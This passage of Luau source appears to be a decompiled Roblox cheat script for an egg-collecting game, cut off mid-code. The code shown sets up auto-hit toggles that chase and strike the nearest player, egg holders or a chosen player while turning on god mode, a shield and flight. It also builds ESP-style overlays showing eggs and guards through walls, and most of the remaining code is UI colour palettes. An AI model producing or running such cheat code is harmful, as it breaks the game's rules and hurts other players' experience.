			local plan = combat.Plan(v16, humanoidRootPart)
			local flag5 = v13 ~= tbl19[2]

			if not fn44() and (flag5 or not combat.SelfRagdolled()) and tbl4.ClaimMovement("combat") and not tbl4.AntiGuard.Busy then
				if not tbl20.Moving then
					tbl20.Moving = true
					tbl4.Shield("combat", true)
					tbl4.GodMode(true)
					tbl4.BeginFlight()
				end

				tbl4.GodTick()
				tbl20.Plan = plan
			else
				if tbl20.Moving then
					fn43()
				end

				tbl20.Plan = nil
			end

			local v17 = combat.TryHit(v16, plan, flag5)
			plan = plan and math.floor(plan.Distance + 0.5) or 0

			if v17 then
				tbl20.Status = v17 .. string.format("  %d studs", plan)
			elseif fn44() then
				tbl20.Status = string.format("Waiting for Auto Steal, near %s", v16.DisplayName)
			else
				tbl20.Status = string.format("Chasing %s  %d studs", v16.DisplayName, plan)
			end
		end

		local function fn47()
			local tbl21 = {}

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					table.insert(tbl21, player)
				end
			end

			table.sort(tbl21, function(arg, arg2)
				return string.lower(arg.DisplayName) < string.lower(arg2.DisplayName)
			end)

			local tbl22 = {}

			for _, v13 in ipairs(tbl21) do
				tbl22[v13.DisplayName] = (tbl22[v13.DisplayName] or 0) + 1
			end

			local tbl23 = {}
			local tbl24 = {}

			for _, v13 in ipairs(tbl21) do
				local displayName = v13.DisplayName

				if tbl22[displayName] > 1 then
					displayName = string.format("%s (@%s)", v13.DisplayName, v13.Name)
				end

				table.insert(tbl23, displayName)
				tbl24[displayName] = v13.Name
			end

			if #tbl23 == 0 then
				tbl23[1] = str3
			end

			return tbl23, tbl24
		end

		local function fn48(arg)
			for k, v13 in pairs(tbl20.LabelToName) do
				if v13 == arg then
					return k
				end
			end

			return nil
		end

		local connection = RunService.PreSimulation:Connect(function(deltaTime)
			local plan = tbl20.Plan
			if not plan or not tbl20.Moving then
				return
			end
			local v13 = tbl4.Root()

			if v13 then
				combat.Steer(v13, plan, tbl20.Speed, math.max(tbl20.Speed, tbl20.MaxSpeed), deltaTime)
			end
		end)

		local n16 = 0.05
		local n17 = 0

		local connection2 = RunService.Heartbeat:Connect(function()
			local flag4 = fn38() ~= nil
			local v13 = fn39()

			if not v13 then
				tbl20.AuraVictim = nil
			end

			local now = os.clock()

			if flag4 or not v13 or now >= n17 then
				if v13 and not flag4 then
					n17 = now + n16
				end

				if not pcall(fn46) then
					tbl20.Status = "Retrying"
				end
			end

			if flag4 or v13 and tbl20.AuraVictim ~= nil then
				pcall(combat.Swing)
			end

			local row = tbl20.Row

			if row and tbl20.Shown ~= tbl20.Status and type(row.Set) == "function" then
				tbl20.Shown = tbl20.Status
				pcall(row.Set, row, tbl20.Status)
			end

			local picker = tbl20.Picker

			if tbl20.NamesDirty and picker and type(picker.SetOptions) == "function" then
				tbl20.NamesDirty = false
				local v14, v15 = fn47()
				tbl20.LabelToName = v15
				pcall(picker.SetOptions, picker, v14, tbl20.Picked and fn48(tbl20.Picked) or v14[1], false)
			end
		end)

		local connection3 = Players.PlayerAdded:Connect(function()
			tbl20.NamesDirty = true
		end)

		local connection4 = Players.PlayerRemoving:Connect(function(player)
			tbl20.NamesDirty = true

			if tbl20.Target == player then
				tbl20.Target = nil
			end
		end)

		fn4(function()
			for _, v13 in ipairs({ connection, connection2, connection3, connection4 }) do
				pcall(function()
					v13:Disconnect()
				end)
			end

			tbl20.Target = nil
			fn43()
		end)

		local function fn49(arg, arg2)
			if tbl4.Toggle(arg, false) and tbl4.Toggle(tbl4.InvisibilityHandle, false) then
				tbl4.UiDefer(function()
					pcall(arg.Set, arg, false, false)
					tbl4.Notify(arg2, "Turn off Invisibility first, both cannot be on at the same time")
				end)

				return true
			end

			return false
		end

		tbl20.Row = v12:CreateText({ Name = "Hit Status", Text = "Idle" })
		local v13 = v2:CreateExclusiveGroup({ Name = "Chilli Combat Targets", MaxActive = 1 })

		for i, v14 in ipairs({ "Auto Hit Nearest Player", "Auto Hit Egg Holders", "Auto Hit Specific Player" }) do
			local v15 = nil

			v15 = v12:CreateToggle({
				Name = v14,
				Default = false,
				Callback = function()
					fn49(v15, v14)
				end,
			})

			pcall(v15.JoinExclusiveGroup, v15, v13)
			tbl20.Handles[i] = v15
		end

		local v14, v15 = fn47()
		tbl20.LabelToName = v15

		tbl20.Picker = v12:CreateDropdown({
			Name = "Hit Player",
			Options = v14,
			Default = v14[1],
			SubOf = tbl20.Handles[3],
			Callback = function(arg)
				tbl20.Picked = tbl20.LabelToName[tostring(arg)]
				tbl20.Target = nil
			end,
		})

		tbl20.AuraHandle = v12:CreateToggle({
			Name = "Hit Aura",
			Default = false,
			Callback = function()
				fn49(tbl20.AuraHandle, "Hit Aura")
			end,
		})

		pcall(tbl20.AuraHandle.JoinExclusiveGroup, tbl20.AuraHandle, v13)
		local v16 = v12:CreateLabel({ Name = "Chase Settings", Text = "Chase Settings" })

		v12:CreateSlider({
			Name = "Hit Tween Speed",
			SubOf = v16,
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				tbl20.Speed = math.clamp(tonumber(arg) or 400, 100, 1000)
			end,
		})

		v12:CreateSlider({
			Name = "Hit Max Speed",
			SubOf = v16,
			Min = 100,
			Max = 1000,
			Default = 750,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				tbl20.MaxSpeed = math.clamp(tonumber(arg) or 750, 100, 1000)
			end,
		})

		v12:CreateSlider({
			Name = "Hit Lead",
			SubOf = v16,
			Note = "Stand further ahead of the target (+) or closer to them (-)",
			Min = -400,
			Max = 100,
			Default = -275,
			Increment = 1,
			Callback = function(arg)
				combat.SetLead(arg)
			end,
		})

		v12:CreateSlider({
			Name = "Hit Sweep",
			SubOf = v16,
			Note = "How far you move back and forth in front of the target",
			Min = 0,
			Max = 250,
			Default = 60,
			Increment = 1,
			Unit = "%",
			Callback = function(arg)
				combat.SetSweep(arg)
			end,
		})

		local n18 = 2
		local v17 = nil

		local function fn50()
			local getState = v2.GetState
			return v2:GetState("Quick Pinned Features"), getState(v2, "Quick Pin Groups")
		end

		local function fn51()
			local tbl21 = {}

			for _, v18 in ipairs({ tbl20.Handles[1], tbl20.Handles[2], tbl20.AuraHandle }) do
				local ok, result = pcall(function()
					return v18:GetQuickPath()
				end)

				if ok and type(result) == "string" then
					table.insert(tbl21, result)
				end
			end

			return tbl21
		end

		local function fn52()
			local v18, v19 = fn50()
			if not v18 or not v19 then
				return false
			end
			local v20 = v18:Get()
			local v21 = v19:Get()
			if type(v20) ~= "table" or type(v21) ~= "table" then
				return false
			end
			local v22 = fn51()
			if #v22 == 0 then
				return false
			end

			for _, v23 in ipairs(v22) do
				if not table.find(v20, v23) or tonumber(v21[v23]) ~= n18 then
					return false
				end
			end

			return true
		end

		local function fn53()
			if v17 and type(v17.SetActionText) == "function" then
				pcall(v17.SetActionText, v17, fn52() and "Remove" or "Add")
			end
		end

		local function fn54()
			local v18, v19 = fn50()
			if not v18 or not v19 then
				tbl4.Notify("Quick Bar", "The Quick Bar is not ready yet, try again in a moment")
				return
			end
			local v20 = fn52()
			local tbl21 = {}
			local tbl22 = {}
			local v21 = v18:Get()

			if type(v21) == "table" then
				for i, v22 in ipairs(v21) do
					tbl21[i] = v22
				end
			end

			local v22 = v19:Get()

			if type(v22) == "table" then
				for k, v23 in pairs(v22) do
					tbl22[k] = v23
				end
			end

			for _, v23 in ipairs(fn51()) do
				local v24 = table.find(tbl21, v23)

				if v20 then
					if v24 then
						table.remove(tbl21, v24)
					end

					tbl22[v23] = nil
				else
					tbl22[v23] = n18

					if not v24 then
						table.insert(tbl21, v23)
					end
				end
			end

			v19:Set(tbl22)
			v18:Set(tbl21)
			fn53()
			tbl4.Notify("Quick Bar", v20 and "Removed the hit toggles from Quick Bar 2" or "Added the hit toggles to Quick Bar 2")
		end

		v17 = v12:CreateButton({
			Name = "Add/Remove Hits On Quick Bar 2",
			Note = "Pin or unpin the hit toggles on Quick Bar 2",
			ButtonText = "Add",
			ConfirmText = "Done!",
			Callback = function()
				tbl4.UiDefer(fn54)
			end,
		})

		task.delay(3, function()
			tbl4.UiDefer(fn53)
		end)
	end

	espSection = tbl4.EspSection

	local function fn38(arg, arg2)
		local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
		return ok and result or nil
	end

	tbl6 = {
		MainFont = fn38("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		StatusFont = fn38("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular),
		Sequence = function(arg)
			local v13 = table.create(#arg)

			for i, v14 in ipairs(arg) do
				v13[i] = ColorSequenceKeypoint.new(v14[1], v14[2])
			end

			return ColorSequence.new(v13)
		end,
	}

	color = Color3.fromRGB
	sequence = tbl6.Sequence
	palettes = {}

	do
		local gold = {}
		local tbl19 = {}
		local tbl20 = { 0, color(255, 231, 158) }
		local tbl21 = { 0.4, color(255, 196, 66) }
		local tbl22 = { 1, color(214, 142, 12) }
		tbl19[1] = tbl20
		tbl19[2] = tbl21
		tbl19[3] = tbl22
		gold.Text = sequence(tbl19)
		local tbl23 = {}
		local tbl24 = { 0, color(122, 76, 0) }
		local tbl25 = { 0.55, color(62, 38, 0) }
		local tbl26 = { 1, color(20, 12, 0) }
		tbl23[1] = tbl24
		tbl23[2] = tbl25
		tbl23[3] = tbl26
		gold.Stroke = sequence(tbl23)
		gold.Outline = color(255, 232, 152)
		palettes.Gold = gold
	end

	do
		local orange = {}
		local tbl19 = {}
		local tbl20 = { 0, color(255, 198, 132) }
		local tbl21 = { 0.4, color(255, 146, 40) }
		local tbl22 = { 1, color(206, 92, 0) }
		tbl19[1] = tbl20
		tbl19[2] = tbl21
		tbl19[3] = tbl22
		orange.Text = sequence(tbl19)
		local tbl23 = {}
		local tbl24 = { 0, color(112, 54, 0) }
		local tbl25 = { 0.55, color(56, 27, 0) }
		local tbl26 = { 1, color(18, 8, 0) }
		tbl23[1] = tbl24
		tbl23[2] = tbl25
		tbl23[3] = tbl26
		orange.Stroke = sequence(tbl23)
		orange.Outline = color(255, 194, 112)
		palettes.Orange = orange
	end

	do
		local red = {}
		local tbl19 = {}
		local tbl20 = { 0, color(255, 105, 105) }
		local tbl21 = { 0.4, color(255, 28, 40) }
		local tbl22 = { 1, color(184, 0, 18) }
		tbl19[1] = tbl20
		tbl19[2] = tbl21
		tbl19[3] = tbl22
		red.Text = sequence(tbl19)
		local tbl23 = {}
		local tbl24 = { 0, color(124, 0, 15) }
		local tbl25 = { 0.55, color(61, 0, 9) }
		local tbl26 = { 1, color(18, 0, 3) }
		tbl23[1] = tbl24
		tbl23[2] = tbl25
		tbl23[3] = tbl26
		red.Stroke = sequence(tbl23)
		red.Outline = color(255, 128, 138)
		palettes.Red = red
	end

	do
		local accent = {}
		local tbl19 = {}
		local tbl20 = { 0, color(170, 255, 160) }
		local tbl21 = { 0.45, color(58, 255, 55) }
		local tbl22 = { 1, color(20, 109, 0) }
		tbl19[1] = tbl20
		tbl19[2] = tbl21
		tbl19[3] = tbl22
		accent.Text = sequence(tbl19)
		local tbl23 = {}
		local tbl24 = { 0, color(10, 52, 6) }
		local tbl25 = { 1, color(3, 16, 0) }
		tbl23[1] = tbl24
		tbl23[2] = tbl25
		accent.Stroke = sequence(tbl23)
		accent.Outline = color(58, 255, 55)
		palettes.Accent = accent
	end

	sheen = {}

	do
		local tbl19 = {}
		local tbl20 = { 0, color(255, 255, 255) }
		local tbl21 = { 0.5, color(222, 222, 222) }
		local tbl22 = { 1, color(255, 255, 255) }
		tbl19[1] = tbl20
		tbl19[2] = tbl21
		tbl19[3] = tbl22
		sheen.Text = sequence(tbl19)
	end
end

local v6, v7, tbl7

do
	local n, n2, n3, n4, n5, n6, n7, n8, n9, tweenInfo
	local tweenInfo2, tweenInfo3, tweenInfo4, tweenInfo5, TweenService, color2, fn8, tbl8

	do
		do
			local tbl9 = {}
			local tbl10 = { 0, color(8, 8, 8) }
			local tbl11 = { 1, color(8, 8, 8) }
			tbl9[1] = tbl10
			tbl9[2] = tbl11
			sheen.Stroke = sequence(tbl9)
		end

		sheen.Outline = color(255, 255, 255)
		palettes.Sheen = sheen
		tbl6.Palettes = palettes

		tbl6.PaletteFromColor = function(arg)
			local color3 = Color3.new(1, 1, 1)
			local color4 = Color3.new(0, 0, 0)
			local tbl9 = {}
			local sequence2 = tbl6.Sequence
			local tbl10 = {}
			local tbl11 = { 0, arg:Lerp(color3, 0.5) }
			local tbl12 = { 0.4, arg:Lerp(color3, 0.1) }
			local tbl13 = { 1, arg:Lerp(color4, 0.25) }
			tbl10[1] = tbl11
			tbl10[2] = tbl12
			tbl10[3] = tbl13
			tbl9.Text = sequence2(tbl10)
			local sequence3 = tbl6.Sequence
			local tbl14 = {}
			local tbl15 = { 0, arg:Lerp(color4, 0.55) }
			local tbl16 = { 0.55, arg:Lerp(color4, 0.75) }
			local tbl17 = { 1, arg:Lerp(color4, 0.92) }
			tbl14[1] = tbl15
			tbl14[2] = tbl16
			tbl14[3] = tbl17
			tbl9.Stroke = sequence3(tbl14)
			tbl9.Outline = arg:Lerp(color3, 0.25)
			return tbl9
		end

		tbl6.SizeScale = 1
		local tbl9 = {}

		tbl6.OnSizeChanged = function(arg)
			table.insert(tbl9, arg)
		end

		tbl6.SetSizeScale = function(sizeScale)
			if tbl6.SizeScale == sizeScale then
				return
			end
			tbl6.SizeScale = sizeScale

			for _, v8 in ipairs(tbl9) do
				pcall(v8)
			end
		end

		tbl6.RowHeight = function(arg)
			local currentCamera = workspace.CurrentCamera
			return math.max(6, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.014, 13, 19) * (arg or tbl6.SizeScale)))
		end

		tbl6.ScaledWidth = function(arg, arg2)
			return math.max(30, math.floor(arg * (arg2 or tbl6.SizeScale)))
		end

		tbl6.CreateRuntime = function()
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = fn3()
			screenGui.Archivable = false
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = true
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.DisplayOrder = 48
			screenGui.Parent = v3
			return screenGui
		end

		tbl6.CreateTag = function(parent, maxDistance)
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = fn3()
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = maxDistance
			local frame = Instance.new("Frame")
			frame.Name = fn3()
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.Name = fn3()
			uiListLayout.FillDirection = Enum.FillDirection.Vertical
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = frame
			billboardGui.Parent = parent
			return billboardGui, frame
		end

		tbl6.CreateTextRow = function(parent, fontFace, layoutOrder, arg)
			local frame = Instance.new("Frame")
			frame.Name = fn3()
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, arg)
			frame.LayoutOrder = layoutOrder
			frame.Parent = parent

			local function createTextLabel(zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = fn3()
				textLabel.BackgroundTransparency = 1
				textLabel.Size = UDim2.fromScale(1, 1)
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex

				if fontFace then
					textLabel.FontFace = fontFace
				else
					textLabel.Font = Enum.Font.GothamBold
				end

				textLabel.Parent = frame
				return textLabel
			end

			local v8 = createTextLabel(2)
			v8.Position = UDim2.fromOffset(1, 1)
			v8.TextColor3 = Color3.new(0, 0, 0)
			v8.TextTransparency = 0.1
			local v9 = createTextLabel(3)
			v9.TextColor3 = Color3.new(1, 1, 1)
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = fn3()
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Color = Color3.new(1, 1, 1)
			uiStroke.Transparency = 0.05

			uiStroke.Thickness = pcall(function()
				uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end) and 0.05 or 1.2

			uiStroke.Parent = v9
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Name = fn3()
			uiGradient.Rotation = 90
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Name = fn3()
			uiGradient2.Rotation = 90
			uiGradient2.Parent = v9
			return { Holder = frame, Shadow = v8, Label = v9, StrokeGradient = uiGradient, TextGradient = uiGradient2, Palette = nil }
		end

		tbl6.SetRow = function(arg, text, palette)
			if arg.Label.Text ~= text then
				arg.Label.Text = text
				arg.Shadow.Text = text
			end

			if arg.Palette ~= palette then
				arg.Palette = palette
				arg.TextGradient.Color = palette.Text
				arg.TextGradient.Rotation = palette.Rotation or 90
				arg.StrokeGradient.Color = palette.Stroke
			end
		end

		tbl6.ReadToggle = function(arg, arg2)
			if type(arg) ~= "table" then
				return arg2 == true
			end

			local ok, result = pcall(function()
				local controller = arg._controller
				return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
			end)

			if ok and type(result) == "boolean" then
				return result
			end

			for _, v8 in ipairs({ "Get", "GetValue" }) do
				local ok2, result2 = pcall(function()
					return arg[v8]
				end)

				if ok2 and type(result2) == "function" then
					local ok3, result3 = pcall(result2, arg)
					if ok3 and type(result3) == "boolean" then
						return result3
					end
				end
			end

			return arg2 == true
		end

		tbl6.SyncSoon = function(arg)
			arg()
			task.delay(0.35, arg)
		end

		tbl6.GetGuardAreas = function()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			local areas = world and world:FindFirstChild("Areas")
			return areas and areas:FindFirstChild("GuardAreas")
		end

		tbl6.FindGuardRoot = function(arg)
			local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart and humanoidRootPart:IsA("BasePart") then
				return humanoidRootPart
			end

			if arg.PrimaryPart then
				return arg.PrimaryPart
			end
			return arg:FindFirstChildWhichIsA("BasePart", true)
		end

		tbl6.WatchGuards = function(arg)
			local tbl10 = {}
			local v8 = tbl6.GetGuardAreas()
			if not v8 then
				return tbl10
			end

			local function fn9(child)
				local guard = child:FindFirstChild("Guard")

				if guard and guard:IsA("Model") then
					arg(child.Name, guard)
				end

				table.insert(tbl10, child.ChildAdded:Connect(function(child2)
					if child2.Name == "Guard" and child2:IsA("Model") then
						arg(child.Name, child2)
					end
				end))
			end

			for _, child in ipairs(v8:GetChildren()) do
				fn9(child)
			end

			table.insert(tbl10, v8.ChildAdded:Connect(fn9))
			return tbl10
		end

		tbl6.DisconnectAll = function(arg)
			for _, v8 in ipairs(arg) do
				pcall(function()
					v8:Disconnect()
				end)
			end

			table.clear(arg)
		end

		local n10
		n10 = 18
		local tbl10

		tbl10 = {
			"Icon",
			"Name",
			"Rarity",
			"Mutation",
			"Value",
			"Weight",
			"Size",
			"Sell Price",
			"Distance",
			"Area",
			"State",
		}

		local tbl11
		tbl11 = { "Icon", "Name", "Value" }
		local tbl12
		tbl12 = { "Off", "Rare Only", "All Shown" }
		local tbl13
		tbl13 = { Icon = 3.2, Name = 1.35, Rarity = 1.2, Mutation = 1, Value = 1.1, Info = 1 }
		local v8

		local function fn9()
			local ok, result = pcall(Font.new, "rbxassetid://12187365977", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
			return ok and result or tbl6.StatusFont
		end

		v8 = fn9()
		local v9

		do
			local sequence2 = tbl6.Sequence
			local tbl14 = {}
			local tbl15 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl16 = { 0.2, Color3.fromRGB(206, 212, 224) }
			local tbl17 = { 0.42, Color3.fromRGB(74, 80, 94) }
			local tbl18 = { 0.58, Color3.fromRGB(42, 46, 56) }
			local tbl19 = { 0.78, Color3.fromRGB(158, 166, 182) }
			local tbl20 = { 1, Color3.fromRGB(250, 252, 255) }
			tbl14[1] = tbl15
			tbl14[2] = tbl16
			tbl14[3] = tbl17
			tbl14[4] = tbl18
			tbl14[5] = tbl19
			tbl14[6] = tbl20
			v9 = sequence2(tbl14)
		end

		local v10
		v10 = tbl6.PaletteFromColor(Color3.fromRGB(77, 255, 122))
		local tbl14
		tbl14 = {}

		do
			local sequence2 = tbl6.Sequence
			local tbl15 = {}
			local tbl16 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl17 = { 0.5, Color3.fromRGB(222, 238, 255) }
			local tbl18 = { 1, Color3.fromRGB(255, 255, 255) }
			tbl15[1] = tbl16
			tbl15[2] = tbl17
			tbl15[3] = tbl18
			tbl14.Text = sequence2(tbl15)
		end

		do
			local sequence2 = tbl6.Sequence
			local tbl15 = {}
			local tbl16 = { 0, Color3.fromRGB(8, 8, 8) }
			local tbl17 = { 1, Color3.fromRGB(8, 8, 8) }
			tbl15[1] = tbl16
			tbl15[2] = tbl17
			tbl14.Stroke = sequence2(tbl15)
		end

		tbl14.Outline = Color3.fromRGB(255, 255, 255)
		local n11
		n11 = 0.8
		local n12
		n12 = 4.5
		local n13
		n13 = 20
		local n14
		n14 = 0.002
		local tbl15
		tbl15 = { Golden = tbl6.Palettes.Gold }

		do
			local silver = {}
			local sequence2 = tbl6.Sequence
			local tbl16 = {}
			local tbl17 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl18 = { 0.45, Color3.fromRGB(214, 222, 232) }
			local tbl19 = { 1, Color3.fromRGB(150, 160, 175) }
			tbl16[1] = tbl17
			tbl16[2] = tbl18
			tbl16[3] = tbl19
			silver.Text = sequence2(tbl16)
			local sequence3 = tbl6.Sequence
			local tbl20 = {}
			local tbl21 = { 0, Color3.fromRGB(60, 66, 78) }
			local tbl22 = { 0.55, Color3.fromRGB(30, 33, 40) }
			local tbl23 = { 1, Color3.fromRGB(10, 11, 14) }
			tbl20[1] = tbl21
			tbl20[2] = tbl22
			tbl20[3] = tbl23
			silver.Stroke = sequence3(tbl20)
			silver.Outline = Color3.fromRGB(214, 222, 232)
			tbl15.Silver = silver
		end

		tbl15.Sakura = tbl6.PaletteFromColor(Color3.fromRGB(255, 158, 216))
		tbl15.GreatBloom = tbl6.PaletteFromColor(Color3.fromRGB(124, 255, 196))
		tbl15.Boss = tbl6.PaletteFromColor(Color3.fromRGB(255, 122, 122))
		tbl15.Monstrous = tbl6.PaletteFromColor(Color3.fromRGB(192, 139, 255))

		do
			local rainbow = {}
			local sequence2 = tbl6.Sequence
			local tbl16 = {}
			local tbl17 = { 0, Color3.fromRGB(255, 107, 107) }
			local tbl18 = { 0.2, Color3.fromRGB(255, 179, 107) }
			local tbl19 = { 0.4, Color3.fromRGB(255, 240, 107) }
			local tbl20 = { 0.6, Color3.fromRGB(107, 255, 138) }
			local tbl21 = { 0.8, Color3.fromRGB(107, 200, 255) }
			local tbl22 = { 1, Color3.fromRGB(185, 107, 255) }
			tbl16[1] = tbl17
			tbl16[2] = tbl18
			tbl16[3] = tbl19
			tbl16[4] = tbl20
			tbl16[5] = tbl21
			tbl16[6] = tbl22
			rainbow.Text = sequence2(tbl16)
			local sequence3 = tbl6.Sequence
			local tbl23 = {}
			local tbl24 = { 0, Color3.fromRGB(20, 20, 30) }
			local tbl25 = { 1, Color3.fromRGB(8, 8, 12) }
			tbl23[1] = tbl24
			tbl23[2] = tbl25
			rainbow.Stroke = sequence3(tbl23)
			rainbow.Outline = Color3.fromRGB(255, 255, 255)
			rainbow.Rotation = 0
			tbl15.Rainbow = rainbow
		end

		local v11
		v11 = tbl6.PaletteFromColor(Color3.fromRGB(143, 227, 255))
		local rfEggWorldAskFieldEggSnapshot
		rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
		local n15
		n15 = 0
		local tbl16

		tbl16 = {
			Eggs = false,
			MinRarity = 5,
			Specific = {},
			MutationSet = {},
			AnyMutation = false,
			NoMutation = false,
			Info = {},
			Highlight = tbl12[1],
			MinValue = 0,
			HighlightMin = 6,
			MaxDistance = math.huge,
			SizeScale = 0.75,
			FixedSize = false,
			OwnBase = true,
		}

		for _, v12 in ipairs(tbl11) do
			tbl16.Info[v12] = true
		end

		local tbl17
		tbl17 = {}
		local tbl18, v12, flag, n16, n17, flag2, v13, fn10, fn11, fn12
		local fn13, tbl19

		do
			local tbl20 = {}
			tbl18 = {}
			v12 = nil
			flag = false
			n16 = 0
			n17 = 0
			flag2 = false
			v13 = nil
			local n18 = 0

			fn10 = function(arg)
				local v14 = tbl20[arg]
				if v14 then
					return v14
				end
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag3 = type(directory) == "table" and directory[arg]
				local rarity = type(flag3) == "table" and type(flag3.Rarity) == "table" and flag3.Rarity or nil
				local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.new(1, 1, 1)
				local v15 = tbl6.PaletteFromColor(color3)
				local rarityGradient = rarity and rarity.RarityGradient

				if rarity and typeof(rarityGradient) ~= "Instance" then
					local assets = ReplicatedStorage:FindFirstChild("Assets")
					rarityGradient = assets and assets:FindFirstChild("UI")
					rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradients")

					if rarityGradient then
						rarityGradient = rarityGradient:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
					end

					rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
				end

				if typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient") then
					v15.Text = rarityGradient.Color
					v15.Rotation = rarityGradient.Rotation
				end

				local name

				if rarity then
					name = tostring(rarity.DisplayName or rarity._id or "")
				else
					name = rarity
				end

				name = name or ""
				local rarityPalette

				if string.upper(name) ~= "SECRET" then
					rarityPalette = v15
				else
					rarityPalette = { Text = v9, Stroke = v15.Stroke, Outline = v15.Outline, Rotation = 90 }
				end

				local tbl21 = {}

				if rarity then
					rarity = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				tbl21.Number = rarity or 0
				tbl21.Name = name
				tbl21.Color = color3
				tbl21.Palette = v15
				tbl21.RarityPalette = rarityPalette
				local flag4 = type(flag3) == "table"
				local displayName

				if flag4 then
					displayName = tostring(flag3.DisplayName or arg)
				else
					displayName = flag4
				end

				tbl21.DisplayName = displayName or tostring(arg)
				tbl21.Icon = type(flag3) == "table" and flag3.Icon or nil
				tbl21.EarningRate = type(flag3) == "table" and tonumber(flag3.EarningRate) or 0
				tbl20[arg] = tbl21
				return tbl21
			end

			local function fn14(arg)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
				if areaEggSlotsClient and areaEggSlotsClient:IsA("Model") then
					local hitbox = areaEggSlotsClient:FindFirstChild("Hitbox")
					return areaEggSlotsClient, hitbox and hitbox:IsA("BasePart") and hitbox or nil
				end
				return nil, nil
			end

			local function fn15()
				if not v13 or not v13.Parent then
					v13 = tbl6.CreateRuntime()
				end
			end

			local function fn16(arg)
				local n19 = tonumber(arg) or 0
				local tbl21 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n20 = 1

				while math.abs(n19) >= 1000 and n20 < #tbl21 do
					n19 /= 1000
					n20 += 1
				end

				return string.format(n20 == 1 and "%.0f%s" or "%.2f%s", n19, tbl21[n20])
			end

			local function fn17(arg)
				local currentCamera = workspace.CurrentCamera
				if not currentCamera then
					return tbl16.MaxDistance
				end
				return math.min(tbl16.MaxDistance, arg * currentCamera.ViewportSize.Y / 2 * n13 * math.tan(math.rad(currentCamera.FieldOfView) * 0.5))
			end

			local function fn18(arg)
				local tbl21 = {
					{ arg.IconHolder, tbl13.Icon, arg.ShowIcon },
					{ arg.NameRow.Holder, tbl13.Name, arg.ShowName },
					{ arg.RarityRow.Holder, tbl13.Rarity, arg.ShowRarity },
					{ arg.MutationRow.Holder, tbl13.Mutation, arg.ShowMutation },
					{ arg.ValueRow.Holder, tbl13.Value, arg.ShowValue },
					{ arg.ExtraRow.Holder, tbl13.Info, arg.ShowExtra },
				}

				local n19 = 0

				for _, v14 in ipairs(tbl21) do
					if v14[3] then
						n19 += v14[2]
					end
				end

				local n20 = math.max(n19, 1)

				for _, v14 in ipairs(tbl21) do
					v14[1].Visible = v14[3]
					v14[1].Size = UDim2.fromScale(1, v14[3] and v14[2] / n20 or 0)
				end

				local v14 = tbl6.ScaledWidth(120, tbl16.SizeScale)
				local height = math.max(1, math.floor(tbl6.RowHeight(tbl16.SizeScale) * n20))

				if arg.Width ~= v14 or arg.Height ~= height or arg.Fixed ~= tbl16.FixedSize then
					arg.Width = v14
					arg.Height = height
					arg.Fixed = tbl16.FixedSize

					if tbl16.FixedSize then
						local n21 = n12 * tbl16.SizeScale
						arg.Billboard.Size = UDim2.fromScale(n21, n21 * height / v14)
						arg.Billboard.MaxDistance = fn17(n21)
					else
						arg.Billboard.Size = UDim2.fromOffset(v14, height)
						arg.Billboard.MaxDistance = tbl16.MaxDistance
					end
				end
			end

			fn11 = function(arg)
				arg.Width = nil
				fn18(arg)
			end

			local function fn19()
				local v14, v15 = tbl6.CreateTag(v13, tbl16.MaxDistance)
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.BackgroundTransparency = 1
				frame.BorderSizePixel = 0
				frame.LayoutOrder = 0
